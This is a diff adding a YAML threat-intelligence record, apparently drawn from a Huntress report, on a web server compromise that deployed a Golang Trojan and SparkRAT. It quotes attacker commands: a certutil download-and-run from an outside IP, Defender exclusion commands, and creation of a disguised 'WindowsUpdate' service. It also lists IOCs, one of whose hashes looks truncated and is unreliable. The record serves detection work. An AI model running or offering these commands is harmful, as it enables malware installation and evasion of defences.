@@ -1,0 +1,87 @@
+description: Threat actors used web server compromise to execute commands and deploy
+  malware, including Golang Trojan agent.exe and SparkRAT dllhost.exe, with attempts
+  to disable Windows Defender.
+malware_families:
+- Golang Trojan
+- SparkRAT
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - attrib.exe
+  - sc.exe
+  - w3wp.exe
+  - whoami.exe
+  - test.exe
+  - http.exe
+  commandline:
+  - \"cmd\" /c certutil.exe -urlcache -split -f http://110.172.104.95:8000/api/download/windows-tools/amd64
+    C:\\Users\\Public\\agent.exe && start /b C:\\Users\\Public\\agent.exe
+  - \"cmd\" /c dir c:\\users\\public
+  - \"cmd\" /c c:\\users\\public\\815.exe
+  - powershell -command Add-MpPreference -ExclusionPath C:\\users\\public -ExclusionExtension
+    .exe, .bin, .dll -Force
+  - powershell -command Add-MpPreference -ExclusionPath C:\\windows\\system32\\0409
+    -ExclusionExtension .exe, .bin, .dll -Force
+  - powershell -command Add-MpPreference -ExclusionPath C:\\windows\\system32\\inetsrv
+    -ExclusionExtension .exe, .bin, .dll -Force
+  - powershell -command Add-MpPreference -ExclusionPath C:\\windows\\syswow64\\inetsrv
+    -ExclusionExtension .exe, .bin, .dll -Force
+  - attrib C:\\Windows\\system32\\0409\\dllhost.exe +s +h
+  - sc.exe create WindowsUpdate binPath= "C:\\Windows\\system32\\dllhost.exe" start=
+    auto
+  powershell:
+  - Add-MpPreference -ExclusionPath C:\\users\\public -ExclusionExtension .exe, .bin,
+    .dll -Force
+  - Add-MpPreference -ExclusionPath C:\\windows\\system32\\0409 -ExclusionExtension
+    .exe, .bin, .dll -Force
+  - Add-MpPreference -ExclusionPath C:\\windows\\system32\\inetsrv -ExclusionExtension
+    .exe, .bin, .dll -Force
+  - Add-MpPreference -ExclusionPath C:\\windows\\syswow64\\inetsrv -ExclusionExtension
+    .exe, .bin, .dll -Force
+  - Get-MpPreference , Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - w3wp.exe -> 188.253.126.205
+  - w3wp.exe -> 188.253.126.202
+  - w3wp.exe -> 103.36.25.171
+  file_activity:
+  - C:\\Users\\Public\\agent.exe
+  - C:\\Users\\Public\\ca.bin
+  - C:\\Windows\\system32\\0409\\dllhost.exe
+  - C:\\Users\\Public\\http.exe
+  - C:\\Users\\Public\\test.exe
+  - C:\\users\\public\\815.exe
+  persistence:
+  - Adding Windows Defender exclusions
+  - Creating a Windows service named WindowsUpdate
+  process_relations:
+  - w3wp.exe -> whoami.exe
+  - w3wp.exe -> cmd.exe
+  - cmd.exe -> certutil.exe
+  - cmd.exe -> start /b C:\\Users\\Public\\agent.exe
+  - w3wp.exe -> test.exe
+  - test.exe -> dllhost.exe
+IOCs:
+  hashes:
+  - 909460d974261be6cc86bbdfa27bd72ccaa66d5fa9cbae7e60d725df13d7e210
+  - 66a28bd3502b41480f36bd227ff5c2b75e0d41900457e5b46b00602ca2ea88cf
+  - 272de450450606d3c71a2d97c0fcccf862dfa6c76bca3e68fe2930d9decb33d2
+  - 3804ba59d530a903d29fe5f
+  ip_addresses:
+  - 110.172.104.95
+  - 188.253.126.205
+  - 188.253.126.202
+  - 103.36.25.171
+  - 188.253.121.101
+  domains: []
+  urls:
+  - http://110.172.104.95:8000/api/download/windows-tools/amd64
+authors:
+- Harlan Carvey
+- Lindsey O'Donnell-Welch
+reference: https://www.huntress.com/blog/trial-error-typos-malware-attacks-sophisticated
+date_of_publication: November 17, 2025
+file_creation_date: December 23, 2025
